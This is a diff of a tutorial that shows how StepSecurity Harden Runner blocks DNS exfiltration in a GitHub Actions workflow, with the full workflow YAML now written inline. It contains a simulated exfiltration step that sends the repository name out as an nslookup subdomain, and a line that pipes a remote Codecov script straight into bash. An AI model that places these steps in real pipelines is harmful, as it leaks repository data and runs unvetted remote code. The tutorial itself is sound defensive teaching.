@@ -33,7 +33,32 @@ Learn how to prevent DNS exfiltration from a GitHub Actions workflow.
       with:
         egress-policy: audit
     ```
-    For a seamless experience, StepSecurity recommends copying the full code from [here](https://github.com/step-security/supply-chain-goat/blob/main/sourcecodes/tut1/p3.md) and replacing the previous text entirely.
+    The updated file should look like this:
+    ```
+    name: Test and coverage
+
+    on: [push, pull_request, workflow_dispatch]
+
+    jobs:
+      build:
+        runs-on: ubuntu-latest
+        steps:
+          #Add StepSecurity Harden Runner from here onwards
+          - uses: step-security/harden-runner@v1
+            with:
+              egress-policy: audit
+          - uses: actions/checkout@v2
+            with:
+              fetch-depth: 2
+          - uses: actions/setup-go@v2
+            with:
+              go-version: '1.17'
+          - name: Run coverage
+            run: go test -race -coverprofile=coverage.txt -covermode=atomic
+          - name: Upload coverage to Codecov
+            run: |
+              bash <(curl -s https://codecov.io/bash)
+    ```
 
 4. This change should cause the workflow to run, as it is set to run on push. Click on the `Actions` tab and then click on the `build` tab under the `ci.yml` section to view the workflow run. 
 
@@ -53,7 +78,34 @@ Learn how to prevent DNS exfiltration from a GitHub Actions workflow.
           codecov.io:443
           github.com:443
     ```
-    For a seamless experience, StepSecurity recommends copying the full code from [here](https://github.com/step-security/supply-chain-goat/blob/main/sourcecodes/tut1/p7.md) and replacing the previous text entirely.
+    The updated file should look like this:
+    ```
+    name: Test and coverage
+
+    on: [push, pull_request, workflow_dispatch]
+
+    jobs:
+      build:
+        runs-on: ubuntu-latest
+        steps:
+          #Add StepSecurity Harden Runner from here onwards
+          - uses: step-security/harden-runner@v1
+            with:
+              allowed-endpoints: 
+                codecov.io:443
+                github.com:443
+          - uses: actions/checkout@v2
+            with:
+              fetch-depth: 2
+          - uses: actions/setup-go@v2
+            with:
+              go-version: '1.17'
+          - name: Run coverage
+            run: go test -race -coverprofile=coverage.txt -covermode=atomic
+          - name: Upload coverage to Codecov
+            run: |
+              bash <(curl -s https://codecov.io/bash)
+     ````
 
 8. Simulate a DNS exfiltration attack similar to the one used in the dependency confusion attack. Update the workflow and add the following statement. In the actual attack, the outbound call was made by a malicious package as part of `preinstall` step. In this case, just add this step to the workflow to simulate sending the repo name as a sub-domain to stepsecurity.io. 
 
@@ -64,7 +116,39 @@ Learn how to prevent DNS exfiltration from a GitHub Actions workflow.
           domain=${domain//\//-}
           nslookup "${domain}"
     ```
-    For a seamless experience, StepSecurity recommends copying the full code from [here](https://github.com/step-security/supply-chain-goat/blob/main/sourcecodes/tut1/p8.md) and replacing the previous text entirely.
+    The updated file should look like this:
+    ```
+    name: Test and coverage
+
+    on: [push, pull_request, workflow_dispatch]
+
+    jobs:
+      build:
+        runs-on: ubuntu-latest
+        steps:
+          #Add StepSecurity Harden Runner from here onwards
+          - uses: step-security/harden-runner@v1
+            with:
+              allowed-endpoints: 
+                codecov.io:443
+                github.com:443
+          - uses: actions/checkout@v2
+            with:
+              fetch-depth: 2
+          - uses: actions/setup-go@v2
+            with:
+              go-version: '1.17'
+          - name: Run coverage
+            run: go test -race -coverprofile=coverage.txt -covermode=atomic
+          - name: Upload coverage to Codecov
+            run: |
+              bash <(curl -s https://codecov.io/bash)
+          - name: Simulate DNS traffic
+            run: |
+              domain="${GITHUB_REPOSITORY}.stepsecurity.io"
+              domain=${domain//\//-}
+              nslookup "${domain}"
+      ```
 
 9. This change should cause the workflow to run, as it is set to run on push.
 
